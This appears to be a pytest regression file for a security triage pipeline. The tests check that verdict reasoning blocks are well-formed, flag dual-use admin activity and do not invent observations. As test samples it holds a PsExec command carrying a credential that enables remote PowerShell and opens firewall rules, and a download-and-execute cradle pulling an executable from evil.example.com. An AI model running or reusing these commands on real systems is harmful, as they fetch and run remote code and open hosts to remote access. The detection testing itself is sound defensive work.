"""v1.4.2 · Verdict.reasoning structured block regression.

Locks the four-section reasoning contract in place:
    * every Verdict emits a ``reasoning`` block with the SAME four
      keys — ``observed``, ``composition``, ``conclusion``, ``ambiguity``,
    * the block is populated deterministically from fired intents,
    * dual-use compositions (LATERAL_MOVEMENT + DEFENSE_EVASION) MUST
      surface the ambiguity string — the analyst is told the
      composition is dual-use, never told the artefact IS attacker
      activity.
"""
from __future__ import annotations

import pytest

from v2.investigation.pipeline import investigate

REQUIRED_KEYS = {"observed", "composition", "conclusion", "ambiguity"}


PSEXEC_SAMPLE = (
    r'PsExec.exe \\10.253.34.27 -u .\mativadmin -p BlackCloud@53 -h '
    r'powershell -Command "Enable-PSRemoting -Force -SkipNetworkProfileCheck; '
    r'Set-Service WinRM -StartupType Automatic; Start-Service WinRM; '
    r"Enable-NetFirewallRule -DisplayGroup 'Windows Remote Management'; "
    r"Enable-NetFirewallRule -DisplayGroup 'File and Printer Sharing'\""
)

DOWNLOAD_EXEC_SAMPLE = (
    "Invoke-WebRequest http://evil.example.com/a.exe -OutFile a.exe; "
    "Start-Process a.exe"
)

BENIGN_SAMPLE = 'Write-Host "Hello, world"'


@pytest.mark.parametrize("sample", [PSEXEC_SAMPLE, DOWNLOAD_EXEC_SAMPLE, BENIGN_SAMPLE])
def test_verdict_reasoning_block_shape(sample):
    r = investigate(sample)
    reasoning = r.verdict.reasoning
    assert isinstance(reasoning, dict)
    assert set(reasoning.keys()) == REQUIRED_KEYS, (
        f"reasoning block must have exactly {REQUIRED_KEYS}, got {set(reasoning.keys())}"
    )
    assert isinstance(reasoning["observed"], list)
    assert isinstance(reasoning["composition"], list)
    assert isinstance(reasoning["conclusion"], str)
    assert isinstance(reasoning["ambiguity"], str)
    assert reasoning["conclusion"], "conclusion sentence must never be empty"


def test_psexec_dual_use_surfaces_ambiguity():
    r = investigate(PSEXEC_SAMPLE)
    reasoning = r.verdict.reasoning
    # Composition must reference both drivers.
    assert "lateral_movement" in reasoning["composition"]
    assert "defense_evasion"  in reasoning["composition"]
    # Ambiguity must acknowledge dual-use — analyst honesty rule.
    ambiguity = reasoning["ambiguity"].lower()
    assert "dual-use" in ambiguity or "legitimate" in ambiguity, (
        "dual-use lateral admin verdict MUST surface the ambiguity caveat "
        "so analysts cross-check against change tickets before concluding intent"
    )


def test_download_execute_chain_has_no_dual_use_ambiguity():
    """The classic download-and-run cradle is unambiguously malicious;
    the ambiguity string must be empty for that verdict."""
    r = investigate(DOWNLOAD_EXEC_SAMPLE)
    assert r.verdict.reasoning["ambiguity"] == "", (
        "unambiguously malicious verdicts must not fabricate an ambiguity "
        "caveat — that would be false honesty"
    )


def test_benign_reasoning_has_empty_observation_list():
    r = investigate(BENIGN_SAMPLE)
    reasoning = r.verdict.reasoning
    assert reasoning["observed"]    == []
    assert reasoning["composition"] == []
    assert reasoning["ambiguity"]   == ""
    assert "benign" in reasoning["conclusion"].lower()


def test_reasoning_observed_never_invents_purposes():
    """Every ``observed`` line MUST be a verbatim intent purpose from
    the fired intents. The verdict engine may not invent narrative."""
    r = investigate(PSEXEC_SAMPLE)
    reasoning = r.verdict.reasoning
    intent_purposes = {i.purpose for i in r.intent.intents}
    for line in reasoning["observed"]:
        assert line in intent_purposes, (
            f"reasoning.observed contained a line NOT emitted by any intent — "
            f"potential fabrication: {line!r}"
        )


def test_reasoning_survives_json_round_trip():
    """The reasoning block must serialize cleanly for the frontend."""
    import json
    r = investigate(PSEXEC_SAMPLE)
    dumped = json.dumps(r.verdict.to_dict()["reasoning"])
    reloaded = json.loads(dumped)
    assert set(reloaded.keys()) == REQUIRED_KEYS
